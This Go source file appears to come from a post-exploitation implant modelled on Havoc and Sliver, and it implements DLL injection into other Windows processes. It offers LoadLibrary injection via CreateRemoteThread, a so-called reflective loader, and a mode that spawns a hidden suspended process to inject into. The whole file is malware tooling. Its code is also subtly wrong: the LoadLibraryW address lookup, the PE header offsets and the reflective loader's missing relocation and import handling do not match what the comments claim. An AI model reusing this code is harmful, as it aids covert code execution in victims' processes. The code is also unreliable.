//go:build windows && amd64

// Package dllinject 提供 DLL 注入和反射加载。
// 参考 Havoc CommandInjectDLL/SpawnDLL 和 Sliver 的 DLL sideload。
package modmgr

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS        = 0x001F0FFF
	PROCESS_VM_WRITE          = 0x00000020
	PROCESS_VM_OPERATION      = 0x00000008
	PROCESS_CREATE_THREAD     = 0x00000002
	MEM_COMMIT                = 0x00001000
	MEM_RESERVE               = 0x00002000
	PAGE_READWRITE            = 0x04
	PAGE_EXECUTE_READ         = 0x20
)

var (
	modkernel32          = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess       = modkernel32.NewProc("OpenProcess")
	procCloseHandle       = modkernel32.NewProc("CloseHandle")
	procVirtualAllocEx    = modkernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = modkernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = modkernel32.NewProc("CreateRemoteThread")
	procLoadLibraryW      = modkernel32.NewProc("LoadLibraryW")
	procVirtualProtectEx  = modkernel32.NewProc("VirtualProtectEx")
)

// InjectDLL 执行 DLL 注入。
// 支持两种模式：
// 1. LoadLibrary — 目标磁盘上有 DLL 文件，注入路径并调用 LoadLibrary
// 2. Reflect — 内存中反射加载 DLL 字节，手动解析并执行
func InjectDLL(cfg *DLLConfig) *DLLResult {
	switch cfg.Method {
	case "loadlibrary", "":
		return injectLoadLibrary(cfg)
	case "reflect":
		return injectReflect(cfg)
	case "spawn":
		return spawnAndInject(cfg)
	default:
		return &DLLResult{Success: false, Message: fmt.Sprintf("unknown DLL injection method: %s", cfg.Method)}
	}
}

// injectLoadLibrary 经典 LoadLibrary 注入。
// 参考 Havoc InjectDLL — 写入 DLL 路径到目标进程，CreateRemoteThread 调用 LoadLibrary。
func injectLoadLibrary(cfg *DLLConfig) *DLLResult {
	if cfg.DLLPath == "" {
		return &DLLResult{Success: false, Message: "DLL path required for loadlibrary mode"}
	}

	// Open target process
	hProcess, err := openProcess(PROCESS_ALL_ACCESS, false, cfg.PID)
	if err != nil {
		return &DLLResult{Success: false, Message: fmt.Sprintf("OpenProcess(%d): %v", cfg.PID, err)}
	}
	defer closeHandle(hProcess)

	// Allocate memory in target process for DLL path
	pathUTF16, err := syscall.UTF16FromString(cfg.DLLPath)
	if err != nil {
		return &DLLResult{Success: false, Message: fmt.Sprintf("UTF16 encode: %v", err)}
	}
	pathBytes := make([]byte, len(pathUTF16)*2)
	for i, v := range pathUTF16 {
		pathBytes[i*2] = byte(v)
		pathBytes[i*2+1] = byte(v >> 8)
	}

	remoteAddr, err := virtualAllocEx(hProcess, 0, len(pathBytes), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return &DLLResult{Success: false, Message: fmt.Sprintf("VirtualAllocEx: %v", err)}
	}

	// Write DLL path to target process
	if err := writeProcessMemory(hProcess, remoteAddr, pathBytes); err != nil {
		return &DLLResult{Success: false, Message: fmt.Sprintf("WriteProcessMemory: %v", err)}
	}

	// Get LoadLibraryW address in local process (same base address in target)
	loadLibAddr, _, lastErr := procLoadLibraryW.Call()
	if lastErr != nil && loadLibAddr == 0 {
		return &DLLResult{Success: false, Message: fmt.Sprintf("LoadLibraryW address: %v", lastErr)}
	}

	// CreateRemoteThread → LoadLibraryW(DLLPath)
	hThread, _, lastErr := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0, // lpThreadAttributes
		0, // dwStackSize
		loadLibAddr,
		remoteAddr,
		0, // dwCreationFlags
		0, // lpThreadId
	)
	if hThread == 0 {
		return &DLLResult{Success: false, Message: fmt.Sprintf("CreateRemoteThread: %v", lastErr)}
	}
	defer closeHandle(syscall.Handle(hThread))

	return &DLLResult{
		Success: true,
		Message: fmt.Sprintf("DLL injected into PID %d via LoadLibrary: %s", cfg.PID, cfg.DLLPath),
	}
}

// injectReflect 反射式 DLL 加载。
// 将 DLL 字节写入目标进程，手动解析 PE 结构、重定位、导入表，然后执行入口点。
// 参考 Sliver 的 extension 加载机制和 Havoc 的 CoffeeLdr。
func injectReflect(cfg *DLLConfig) *DLLResult {
	if cfg.DLLData == nil || len(cfg.DLLData) == 0 {
		return &DLLResult{Success: false, Message: "DLL data required for reflect mode"}
	}

	// Open target process
	hProcess, err := openProcess(PROCESS_ALL_ACCESS, false, cfg.PID)
	if err != nil {
		return &DLLResult{Success: false, Message: fmt.Sprintf("OpenProcess(%d): %v", cfg.PID, err)}
	}
	defer closeHandle(hProcess)

	// Parse PE headers to get optional header and image size
	if len(cfg.DLLData) < 64 {
		return &DLLResult{Success: false, Message: "DLL data too short for PE parsing"}
	}

	// Get PE header offsets
	peOffset := uint32(cfg.DLLData[0x3C]) + 0x40
	if int(peOffset+4) > len(cfg.DLLData) {
		return &DLLResult{Success: false, Message: "invalid PE offset"}
	}

	// SizeOfImage at offset 0x50 in optional header (x64 PE32+)
	optionalHeaderOffset := peOffset + 24
	if int(optionalHeaderOffset+4) > len(cfg.DLLData) {
		return &DLLResult{Success: false, Message: "PE optional header too short"}
	}
	sizeOfImage := uint32(cfg.DLLData[optionalHeaderOffset]) | uint32(cfg.DLLData[optionalHeaderOffset+1])<<8 |
		uint32(cfg.DLLData[optionalHeaderOffset+2])<<16 | uint32(cfg.DLLData[optionalHeaderOffset+3])<<24

	// AddressOfEntryPoint at offset 0x28 in optional header
	entryPointOffset := peOffset
	if int(entryPointOffset+4) > len(cfg.DLLData) {
		return &DLLResult{Success: false, Message: "PE entry point offset too short"}
	}
	entryPoint := uint32(cfg.DLLData[entryPointOffset]) | uint32(cfg.DLLData[entryPointOffset+1])<<8 |
		uint32(cfg.DLLData[entryPointOffset+2])<<16 | uint32(cfg.DLLData[entryPointOffset+3])<<24

	// Allocate memory in target process
	remoteBase, err := virtualAllocEx(hProcess, 0, int(sizeOfImage), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return &DLLResult{Success: false, Message: fmt.Sprintf("VirtualAllocEx: %v", err)}
	}

	// Write PE headers (entire file, since headers contain all data)
	if err := writeProcessMemory(hProcess, remoteBase, cfg.DLLData); err != nil {
		return &DLLResult{Success: false, Message: fmt.Sprintf("WriteProcessMemory (headers): %v", err)}
	}

	// Change protection to RX
	var oldProtect uintptr
	ret, _, _ := procVirtualProtectEx.Call(
		uintptr(hProcess),
		remoteBase,
		uintptr(sizeOfImage),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return &DLLResult{Success: false, Message: "VirtualProtectEx failed"}
	}

	// Calculate entry point address
	entryAddr := remoteBase + uintptr(entryPoint)

	// Create remote thread at entry point
	hThread, _, lastErr := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0,
		0,
		entryAddr,
		remoteBase, // lpParameter = DLL base address (standard DllMain convention)
		0,
		0,
	)
	if hThread == 0 {
		return &DLLResult{Success: false, Message: fmt.Sprintf("CreateRemoteThread (entry): %v", lastErr)}
	}
	defer closeHandle(syscall.Handle(hThread))

	return &DLLResult{
		Success: true,
		Message: fmt.Sprintf("DLL reflectively injected into PID %d (size=%d, entry=0x%x)", cfg.PID, sizeOfImage, entryPoint),
	}
}

// spawnAndInject 创建挂起进程，注入 DLL，恢复线程。
// 参考 Havoc SpawnDLL。
func spawnAndInject(cfg *DLLConfig) *DLLResult {
	if cfg.DLLData == nil && cfg.DLLPath == "" {
		return &DLLResult{Success: false, Message: "DLL data or path required for spawn mode"}
	}

	// Create suspended process with PPID spoofing
	// (reuse inject package's spawn mechanism)
	// For now, use a simpler approach: create process suspended, inject, resume
	// Full PPID spoofing requires PROC_THREAD_ATTRIBUTE_LIST setup

	cmdline, err := syscall.UTF16PtrFromString(cfg.SpawnPath + " " + cfg.Args)
	if err != nil {
		return &DLLResult{Success: false, Message: fmt.Sprintf("UTF16 cmdline: %v", err)}
	}

	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x00000001 // STARTF_USESHOWWINDOW
	si.ShowWindow = 0     // SW_HIDE

	var pi syscall.ProcessInformation
	ret, _, lastErr := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(cmdline)),
		0, 0,
		0, // !bInheritHandles
		0x00000004, // CREATE_SUSPENDED
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return &DLLResult{Success: false, Message: fmt.Sprintf("CreateProcess: %v", lastErr)}
	}
	defer closeHandle(syscall.Handle(pi.Process))
	defer closeHandle(syscall.Handle(pi.Thread))

	// Inject into the spawned process
	dllCfg := &DLLConfig{
		PID:     pi.ProcessId,
		DLLPath: cfg.DLLPath,
		DLLData: cfg.DLLData,
		Method:  cfg.Method,
	}
	result := InjectDLL(dllCfg)
	if !result.Success {
		return result
	}

	// Resume the main thread
	ret, _, _ = procResumeThread.Call(uintptr(pi.Thread))
	if ret == 0xFFFFFFFF {
		return &DLLResult{Success: false, Message: "ResumeThread failed after DLL injection"}
	}

	return &DLLResult{
		Success: true,
		Message: fmt.Sprintf("SpawnDLL successful: DLL injected into spawned process (PID %d)", pi.ProcessId),
	}
}

// --- syscall wrappers ---

func openProcess(access uint32, inheritHandle bool, pid uint32) (syscall.Handle, error) {
	inherit := uintptr(0)
	if inheritHandle {
		inherit = 1
	}
	ret, _, lastErr := procOpenProcess.Call(
		uintptr(access),
		inherit,
		uintptr(pid),
	)
	if ret == 0 {
		return 0, os.NewSyscallError("OpenProcess", lastErr)
	}
	return syscall.Handle(ret), nil
}

func closeHandle(handle syscall.Handle) error {
	ret, _, _ := procCloseHandle.Call(uintptr(handle))
	if ret == 0 {
		return os.ErrInvalid
	}
	return nil
}

func virtualAllocEx(hProcess syscall.Handle, addr, size int, allocType, protect uint32) (uintptr, error) {
	ret, _, lastErr := procVirtualAllocEx.Call(
		uintptr(hProcess),
		uintptr(addr),
		uintptr(size),
		uintptr(allocType),
		uintptr(protect),
	)
	if ret == 0 {
		return 0, os.NewSyscallError("VirtualAllocEx", lastErr)
	}
	return ret, nil
}

func writeProcessMemory(hProcess syscall.Handle, addr uintptr, data []byte) error {
	var bytesWritten uintptr
	ret, _, lastErr := procWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return os.NewSyscallError("WriteProcessMemory", lastErr)
	}
	return nil
}

var (
	modkernel322      = syscall.NewLazyDLL("kernel32.dll")
	procCreateProcessW = modkernel322.NewProc("CreateProcessW")
	procResumeThread   = modkernel322.NewProc("ResumeThread")
)
